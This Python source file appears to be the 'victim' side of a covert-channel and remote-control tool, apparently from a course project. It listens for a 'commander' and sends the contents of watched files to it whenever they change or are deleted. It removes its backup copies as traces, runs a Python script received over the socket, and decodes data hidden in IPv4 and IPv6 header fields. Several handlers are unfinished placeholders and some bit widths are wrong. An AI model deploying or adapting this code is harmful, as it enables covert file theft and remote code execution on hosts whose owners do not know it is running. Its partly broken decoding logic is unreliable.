import getopt
import ipaddress
import os
import queue
import socket
import sys
from scapy.layers.inet6 import IPv6
import constants
import importlib
import inotify.adapters
from scapy.layers.inet import IP


def parse_arguments():
    # Initialization
    print(constants.OPENING_BANNER)
    source_ip, source_port = "", ""

    # GetOpt Arguments
    arguments = sys.argv[1:]
    opts, user_list_args = getopt.getopt(arguments, 's:p:')

    if len(opts) == constants.ZERO:
        sys.exit(constants.NO_ARG_ERROR)

    for opt, argument in opts:
        if opt == '-s':  # For source IP
            try:
                if argument == constants.LOCAL_HOST:
                    argument = constants.LOCAL_HOST_VALUE
                source_ip = str(ipaddress.ip_address(argument))
            except ValueError as e:
                sys.exit(constants.INVALID_SRC_IP_ADDRESS_ARG_ERROR.format(e))

        if opt == '-p':  # For source port
            try:
                source_port = int(argument)
                if not (constants.MIN_PORT_RANGE < source_port < constants.MAX_PORT_RANGE):
                    sys.exit(constants.INVALID_SRC_PORT_NUMBER_RANGE)
            except ValueError as e:
                sys.exit(constants.INVALID_FORMAT_SRC_PORT_NUMBER_ARG_ERROR.format(e))

    # Check if IPs and Ports were specified
    if len(source_ip) == constants.ZERO:
        sys.exit(constants.NO_SRC_IP_ADDRESS_SPECIFIED_ERROR)

    if len(str(source_port)) == constants.ZERO:
        sys.exit(constants.NO_SRC_PORT_NUMBER_SPECIFIED_ERROR)

    return source_ip, source_port


def initialize_server_socket(source_ip: str, source_port: int):
    """
    Initializes the server socket.

    @param source_ip:
        A string containing the server's IP address

    @param source_port:
        An integer representing the server's port number

    @return: server_socket
        A socket with the binded information
    """
    try:
        # Create a socket object
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Define the server address and port
        server_address = (source_ip, source_port)

        # Bind the socket to the server address and port
        server_socket.bind(server_address)

        # Listen for incoming connections (maximum 5 clients in the queue)
        server_socket.listen(5)
        print(constants.SUCCESS_SOCKET_CREATE_MSG)
        print(constants.SOCKET_INFO_MSG.format(*server_address))

    except PermissionError as e:
        sys.exit(constants.VICTIM_SERVER_SOCKET_CREATION_ERROR_MSG.format(str(e)))

    return server_socket


def is_file_openable(file_path):
    try:
        with open(file_path, constants.READ_MODE) as file:
            pass
        return True
    except IOError as e:
        print(constants.FILE_CANNOT_OPEN_ERROR.format(file_path, e))
        return False


def is_importable(file_name: str):
    print(f"[+] Importing module {file_name}...")

    try:
        importlib.import_module(file_name)
        return True
    except ImportError as e:
        print(constants.FAILED_IMPORT_ERROR.format(file_name, e))
        return False
    except Exception as e:
        print(constants.FAILED_IMPORT_EXCEPTION_ERROR.format(file_name, e))
        return False


def delete_file(file_path: str):
    try:
        if os.path.exists(file_path):
            print(f"[+] OPERATION PENDING: Now deleting {file_path}...")
            os.remove(file_path)
            print(f"[+] OPERATION SUCCESS: {file_path} has been successfully deleted!")
        else:
            print(f"[+] NO ACTION REQUIRED: {file_path} does not exist!")
    except FileNotFoundError:
        print(f"[+] ERROR: The file '{file_path}' does not exist or cannot be deleted.")
    except Exception as e:
        print(f"[+] ERROR: An error occurred while deleting the file: {e}")


def watch_stop_signal(client_socket: socket.socket,
                      signal_queue: queue.Queue):
    while True:
        try:
            signal = client_socket.recv(100).decode()
            if signal == constants.STOP_KEYWORD:
                print(constants.CLIENT_RESPONSE.format(signal))
                signal_queue.put(signal)
                print(constants.WATCH_FILE_SIGNAL_THREAD_END)
                return None
        except socket.timeout as e:
            print("[+] ERROR: Connection to client has timed out : {}".format(e))
            client_socket.settimeout(None)
            return None
        except socket.error as e:
            print("[+] Socket error: {}".format(e))
            client_socket.settimeout(None)
            return None


def __copy_file(source_file_path: str, backup_file_path: str):
    try:
        with open(source_file_path, 'rb') as source:
            with open(backup_file_path, 'wb') as backup:
                while True:
                    chunk = source.read(1024)
                    if not chunk:
                        break
                    backup.write(chunk)
    except Exception as e:
        print(f"[+] COPY FILE TO BACKUP ERROR: An error occurred: {e}")


def create_backup_file(original_filename: str,
                       backup_filename: str,
                       modified_file_dict: dict):
    """
    Creates and replaces the current version of a backup file with a new one
    in the victim's current directory.

    @param original_filename:
            A string representing the original file name

    @param backup_filename:
            A string representing the backup file name

    @param modified_file_dict:
            A dictionary containing files marked with modified status

    @return: None
    """
    # 2) Create an initial backup if it doesn't exist
    if not os.path.exists(backup_filename):
        __copy_file(original_filename, backup_filename)
        print(constants.BACKUP_FILE_CREATED_MSG.format(original_filename, backup_filename))
        return None

    # 3) Check if the file is modified
    if modified_file_dict[original_filename]:  # If modified (true)...
        # a) Remove old backup
        if os.path.exists(backup_filename):
            os.remove(backup_filename)

        # b) Create a new version of backup
        __copy_file(original_filename, backup_filename)
        print(constants.BACKUP_FILE_CREATED_MSG.format(original_filename, backup_filename))

        # c) Remove modification mark
        modified_file_dict[original_filename] = False
    else:
        return None


def remove_file(file_path: str):
    if os.path.exists(file_path):
        os.remove(file_path)
        print("[+] FILE DELETION SUCCESSFUL: The following file has been deleted {}!".format(file_path))
    else:
        print("[+] ERROR: The following file does not exist: {}".format(file_path))


def watch_file(client_socket: socket.socket,
               file_path: str,
               signal_queue: queue.Queue):
    # Create an inotify object
    notifier = inotify.adapters.Inotify()
    print("[+] WATCHING FILE: Now watching the following file: {}".format(file_path))

    # Add the file to watch for modification and delete events
    notifier.add_watch(file_path)

    # Initialize a modified file dictionary to keep track of modified files
    modified_files_dict = {file_path: False}

    # Create Initial Backup Copy of Watch File
    backup_file_name = constants.BACKUP_MODIFIER + "_" + file_path.split("/")[-1]
    create_backup_file(file_path, backup_file_name, modified_files_dict)

    try:
        while True:
            # Wait for events
            for event in notifier.event_gen():
                # Check signal for stop before processing event
                if not signal_queue.empty() and signal_queue.get() == constants.STOP_KEYWORD:
                    notifier.remove_watch(file_path)
                    return None

                if event is not None:
                    (header, type_names, watch_path, _) = event

                    # a) Create a backup (most present) copy for any event (in case of deletion)
                    backup_file_name = constants.BACKUP_MODIFIER + "_" + watch_path
                    create_backup_file(file_path, backup_file_name, modified_files_dict)

                    # c) If Modified -> Send events to Commander for modification
                    if "IN_MODIFY" in type_names:
                        print(constants.WATCH_FILE_MODIFIED.format(watch_path))
                        client_socket.send("IN_MODIFY".encode())

                        # i) Start file transfer
                        with open(file_path, 'rb') as file:
                            while True:
                                file_data = file.read(1024)
                                if not file_data:
                                    break
                                client_socket.send(file_data)

                        client_socket.send(constants.END_OF_FILE_SIGNAL)
                        print(constants.WATCH_FILE_TRANSFER_SUCCESS.format(file_path))

                        # ii) Mark file as modified
                        modified_files_dict[file_path] = True

                    # d) If Deleted -> Send events to notify commander that file has been deleted
                    if "IN_DELETE" in type_names or "IN_DELETE_SELF" in type_names:
                        print(constants.WATCH_FILE_DELETED.format(watch_path))
                        client_socket.send("IN_DELETE".encode())

                        # i) Get backup file path
                        backup_file_name = constants.BACKUP_MODIFIER + "_" + watch_path

                        # ii) Start file transfer
                        with open(backup_file_name, 'rb') as file:
                            while True:
                                file_data = file.read(1024)
                                if not file_data:
                                    break
                                client_socket.send(file_data)

                        client_socket.send(constants.END_OF_FILE_SIGNAL)
                        print(constants.WATCH_FILE_TRANSFER_SUCCESS.format(file_path))

                        # iii) Remove traces of backup
                        remove_file(backup_file_name)

                        # iv) Stop watching file and return to main()
                        print(constants.WATCH_FILE_DELETE_EVENT_END_MSG.format(watch_path))
                        return None

    # Handle Ctrl+C to exit the loop
    except KeyboardInterrupt:
        pass


def __bin_to_bytes(binary_string):
    return bytes(int(binary_string[i:i + 8], 2) for i in range(0, len(binary_string), 8))


def covert_data_write_to_file(covert_data: str, filename: str):
    """
    Creates a file (if does not exist) and writes binary data to the file.

    @param covert_data:
        A string containing binary data

    @param filename:
        A string containing the file name

    @return: None
    """
    if covert_data:
        data = (__bin_to_bytes(covert_data)
                .replace(constants.NULL_BYTE, b'')
                .replace(constants.STX_BYTE, b''))

        with open(filename, constants.WRITE_BINARY_MODE) as f:
            f.write(data)


def get_protocol_header_function_map():
    return {  # A tuple of [Header, Field] => Function
        # a) IPv4 Handlers
        ("IPv4", "Version"): extract_data_ipv4_version,
        ("IPv4", "IHL (Internet Header Length)"): extract_data_ipv4_ihl,
        ("IPv4", "DS (Differentiated Services Codepoint)"): extract_data_ipv4_ds,
        ("IPv4", "Explicit Congestion Notification (ECN)"): extract_data_ipv4_ecn,
        ("IPv4", "Total Length"): extract_data_ipv4_total_length,
        ("IPv4", "Identification"): extract_data_ipv4_identification,
        ("IPv4", "Flags"): extract_data_ipv4_flags,
        ("IPv4", "Fragment Offset"): extract_data_ipv4_frag_offset,
        ("IPv4", "TTL (Time to Live)"): extract_data_ipv4_ttl,
        ("IPv4", "Protocol"): extract_data_ipv4_protocol,
        ("IPv4", "Header Checksum"): extract_data_ipv4_header_chksum,
        ("IPv4", "Source Address"): extract_data_ipv4_src_addr,
        ("IPv4", "Destination Address"): extract_data_ipv4_dst_addr,

        # b) IPv6 Handlers
        ("IPv6", "Version"): extract_data_ipv6_version,
        ("IPv6", "Traffic Class"): extract_data_ipv6_traffic_class,
        ("IPv6", "Flow Label"): extract_data_ipv6_flow_label,
        ("IPv6", "Payload Length"): extract_data_ipv6_payload_length,
        ("IPv6", "Next Header"): extract_data_ipv6_next_header,
        ("IPv6", "Hop Limit"): extract_data_ipv6_hop_limit,
        ("IPv6", "Source Address"): extract_data_ipv6_src_addr,
        ("IPv6", "Destination Address"): "F()",

        # c) TCP Handlers
        ("TCP", "Source Port"): "F()",
        ("TCP", "Destination Port"): "F()",
        ("TCP", "Sequence Number"): "F()",
        ("TCP", "Acknowledgement Number"): "F()",
        ("TCP", "Header Length"): "F()",
        ("TCP", "Reserved"): "F()",
        ("TCP", "Flags"): "F()",
        ("TCP", "Window Size"): "F()",
        ("TCP", "Urgent Pointer"): "F()",
        ("TCP", "Options"): "F()",

        # d) UDP Handlers
        ("UDP", "Source Port"): "F()",
        ("UDP", "Destination Port"): "F()",
        ("UDP", "Length"): "F()",
        ("UDP", "Checksum"): "F()",

        # e) ICMP Handlers
        ("ICMP", "Type (Type of Message)"): "F()",
        ("ICMP", "Code"): "F()",
        ("ICMP", "Checksum"): "F()",
        ("ICMP", "Identifier"): "F()",
        ("ICMP", "Sequence Number"): "F()",
        ("ICMP", "Timestamp"): "F()",
    }

# ===================== IPV4 EXTRACT COVERT DATA FUNCTIONS =====================


def extract_data_ipv4_ttl(packet):
    """
    A handler function to extract data from packets with IPv4
    header and a modified ttl field.

    @note Bit length
        The version field for IPv4 headers is 8 bits

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from ttl field
    """
    if packet.haslayer('IP'):
        covert_data = packet[IP].ttl
        binary_data = format(covert_data, constants.EIGHT_BIT)  # Adjust to 8 bits for each character
        return binary_data


def extract_data_ipv4_version(packet):
    """
    A handler function to extract data from packets with IPv4
    header and a modified version field.

    @note Bit length
        The version field for IPv4 headers is 4 bits

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from version field
    """
    if packet.haslayer('IP'):
        covert_data = packet[IP].version
        binary_data = format(covert_data, constants.FOUR_BIT)  # Adjust to 4 bits for each character
        return binary_data


def extract_data_ipv4_ihl(packet):
    """
    A handler function to extract data from packets with IPv4
    header and a modified IHL field.

    @note Bit length
        The IHL field for IPv4 headers is 4 bits

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from IHL field
    """
    if packet.haslayer('IP'):
        covert_data = packet[IP].ihl
        binary_data = format(covert_data, constants.FOUR_BIT)  # Adjust to 4 bits for each character
        return binary_data


def extract_data_ipv4_ds(packet):
    """
    A handler function to extract data from packets with IPv4
    header and a modified DS (differentiated services) field.

    @note Bit length
        The DS field for IPv4 headers is 6 bits

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if packet.haslayer('IP'):
        covert_data = (packet[IP].tos >> 2) & 0b111111  # Get the first six bits of TOS (starting from most sig. bit)
        binary_data = format(covert_data, constants.SIX_BIT)  # Adjust to 6 bits for each character
        return binary_data


def extract_data_ipv4_ecn(packet):
    """
    A handler function to extract data from packets with IPv4
    header and a modified ECN field.

    @note Bit length
        The ECN field for IPv4 headers is 2 bits

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if packet.haslayer('IP'):
        covert_data = (packet[IP].tos & 0b11)  # Get the last two bits of TOS (starting from least sig. bit)
        binary_data = format(covert_data, constants.TWO_BIT)
        return binary_data


def extract_data_ipv4_total_length(packet):
    """
    A handler function to extract data from packets with IPv4
    header and a modified total length field.

    @note Bit length
        The total length field for IPv4 headers is 16 bits (2 bytes)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if packet.haslayer('IP'):
        covert_data = packet[IP].len
        binary_data = format(covert_data, constants.SIXTEEN_BIT)
        return binary_data


def extract_data_ipv4_identification(packet):
    """
    A handler function to extract data from packets with IPv4
    header and a modified identification field.

    @note Bit length
        The identification field for IPv4 headers is 16 bits (2 bytes)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if packet.haslayer('IP'):
        covert_data = packet[IP].id
        binary_data = format(covert_data, constants.SIXTEEN_BIT)
        return binary_data


def extract_data_ipv4_flags(packet):
    """
    A handler function to extract data from packets with IPv4
    header and a modified flags field.

    @note Bit length
        The flags field for IPv4 headers is 3 bits

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if packet.haslayer('IP'):
        covert_data = int(packet[IP].flags)
        binary_data = format(covert_data, constants.THREE_BIT)
        return binary_data


def extract_data_ipv4_frag_offset(packet):
    """
    A handler function to extract data from packets with IPv4
    header and a modified fragment offset field.

    @note Bit length
        The fragment offset field for IPv4 headers is 13 bits

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if packet.haslayer('IP'):
        covert_data = packet[IP].frag
        binary_data = format(covert_data, constants.THIRTEEN_BIT)
        return binary_data


def extract_data_ipv4_protocol(packet):
    """
    A handler function to extract data from packets with IPv4
    header and a modified protocol field.

    @note Bit length
        The protocol field for IPv4 headers is 8 bits

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if packet.haslayer('IP'):
        covert_data = packet[IP].proto
        binary_data = format(covert_data, constants.EIGHT_BIT)
        return binary_data


def extract_data_ipv4_header_chksum(packet):
    """
    A handler function to extract data from packets with IPv4
    header and a modified header checksum field.

    @note Bit length
        The header checksum field for IPv4 headers is 16 bits (2 bytes)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if packet.haslayer('IP'):
        covert_data = packet[IP].chksum
        binary_data = format(covert_data, constants.SIXTEEN_BIT)
        return binary_data


def extract_data_ipv4_src_addr(packet):
    """
    A handler function to extract data from packets with IPv4
    header and a modified source address field.

    @note Bit length
        The source address field for IPv4 headers is 32 bits (4 bytes)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if packet.haslayer('IP'):
        # a) Initialize Variable
        binary_data = ""

        # b) Get covert data from the packet
        covert_data = packet[IP].src

        # c) Get each octet and place in variable
        ip_octets = covert_data.split('.')  # IP Octet format: XXXX.XXXX.XXXX.XXXX
        for octet in ip_octets:
            binary_data += format(int(octet), constants.THIRTY_TWO_BIT)

        return binary_data


def extract_data_ipv4_dst_addr(packet):
    """
    A handler function to extract data from packets with IPv4
    header and a modified source address field.

    @attention Functionality Disabled
        This is not used

    @note Bit length
        The source address field for IPv4 headers is 32 bits (4 bytes)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if packet.haslayer('IP'):
        # a) Initialize Variable
        binary_data = ""

        # b) Get covert data from the packet
        covert_data = packet[IP].dst

        # c) Get each octet and place in variable
        ip_octets = covert_data.split('.')  # IP Octet format: XXXX.XXXX.XXXX.XXXX
        for octet in ip_octets:
            binary_data += format(int(octet), constants.EIGHT_BIT)

        return binary_data


# ===================== IPV6 EXTRACT COVERT DATA FUNCTIONS =====================


def __is_valid_ipv6(address: str):
    try:
        ipaddress.IPv6Address(address)
        return True
    except ipaddress.AddressValueError as e:
        print(constants.INVALID_IPV6_ERROR.format(e))
        return False


def receive_get_ipv6_script(client_socket: socket.socket, client_ip: str, client_port: int):
    """
    Get ipv6_getter.py from commander, executes the script and sends over
    IPv6 address and port.

    @param client_socket:
        The commander socket

    @param client_ip:
        A string containing the commander's IP address

    @param client_port:
        A string containing the commander's port number

    @return: ipv6, port
        A tuple containing the IPv6 address and port number
        of the executing host machine
    """
    # Get the file name from Commander
    res = client_socket.recv(1024).decode().split("/")
    file_path = res[0]
    file_name = file_path.split(".")[0]  # => Must be without .py extension for importing
    cmdr_ipv6_addr = res[1]

    # Receive File if exists (MUST DO: put in downloads/[client_ip])
    with open(file_path, "wb") as file:
        eof_marker = constants.FILE_END_OF_FILE_SIGNAL  # Define the end-of-file marker

        while True:
            file_data = client_socket.recv(1024)
            if not file_data:
                break  # No more data received
            if file_data.endswith(eof_marker):
                file.write(file_data[:-len(eof_marker)])  # Exclude the end-of-file marker
                break
            else:
                file.write(file_data)

    # Perform Import and Run Function to get IPv6
    if is_file_openable(file_path):
        print(constants.TRANSFER_SUCCESS_MSG.format(file_path))

        # Import module and get IPv6 address
        if is_importable(file_name):
            get_ipv6 = importlib.import_module(file_name)
            ipv6, port = get_ipv6.determine_ipv6_address()  # Run function inside script

            if __is_valid_ipv6(ipv6):
                print(constants.IPV6_FOUND_MSG.format(ipv6))
                client_socket.send((constants.VICTIM_ACK + "/" + ipv6 + "/" + str(port)).encode())  # Transfer Result
                os.remove(file_path)
                return ipv6, port, cmdr_ipv6_addr
            else:
                print(constants.IPV6_OPERATION_ERROR)
                client_socket.send(constants.IPV6_ERROR_MSG_TO_CMDR.encode())
                os.remove(file_path)
                return None, None, None
        else:
            client_socket.send(constants.IMPORT_IPV6_SCRIPT_ERROR.format(file_path).encode())
            os.remove(file_path)
            return None, None, None
    else:
        client_socket.send(constants.FILE_CANNOT_OPEN_TO_SENDER.encode())
        os.remove(file_path)
        return None, None, None


def extract_data_ipv6_version(packet):
    """
    A handler function to extract data from packets with IPv6
    header and a modified version field.

    @note Bit length
        The version field for IPv6 headers is 4 bits

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IPv6 in packet:
        version = packet[IPv6].version
        binary_data = format(version, constants.FOUR_BIT)
        return binary_data


def extract_data_ipv6_traffic_class(packet):
    """
    A handler function to extract data from packets with IPv6
    header and a modified traffic class field.

    @note Bit length
        The traffic class field for IPv6 headers is 8 bits

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IPv6 in packet:
        traffic_class_data = packet[IPv6].tc
        binary_data = format(traffic_class_data, constants.EIGHT_BIT)
        return binary_data


def extract_data_ipv6_flow_label(packet):
    """
    A handler function to extract data from packets with IPv6
    header and a modified flow label field.

    @note Bit length
        The flow label field for IPv6 headers is 20 bits

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IPv6 in packet:
        flow_label_data = packet[IPv6].fl
        binary_data = format(flow_label_data, constants.TWENTY_BIT)
        return binary_data


def extract_data_ipv6_payload_length(packet):
    """
    A handler function to extract data from packets with IPv6
    header and a modified payload length field.

    @note Bit length
        The payload length field for IPv6 headers is 16 bits (2 bytes)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IPv6 in packet:
        payload_length_data = packet[IPv6].plen
        binary_data = format(payload_length_data, constants.SIXTEEN_BIT)
        return binary_data


def extract_data_ipv6_next_header(packet):
    """
    A handler function to extract data from packets with IPv6
    header and a modified next header field.

    @note Bit length
        The next header field for IPv6 headers is 8 bits (1 byte)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IPv6 in packet:
        next_header_data = packet[IPv6].nh
        binary_data = format(next_header_data, constants.EIGHT_BIT)
        return binary_data


def extract_data_ipv6_hop_limit(packet):
    """
    A handler function to extract data from packets with IPv6
    header and a modified hop limit field.

    @note Bit length
        The hop limit field for IPv6 headers is 8 bits (1 byte)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IPv6 in packet:
        hop_limit_data = packet[IPv6].hlim
        binary_data = format(hop_limit_data, constants.EIGHT_BIT)
        return binary_data


def extract_data_ipv6_src_addr(packet):
    """
    A handler function to extract data from packets with IPv6
    header and a modified source address field.

    @note Bit length
        The source address field for IPv6 headers is 128 bits (12 bytes)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IPv6 in packet:
        src_addr_data = packet[IPv6].src
        binary_data = ''.join(format(int(seg, 16), constants.FOUR_BIT) for seg in src_addr_data.split(':'))
        return binary_data
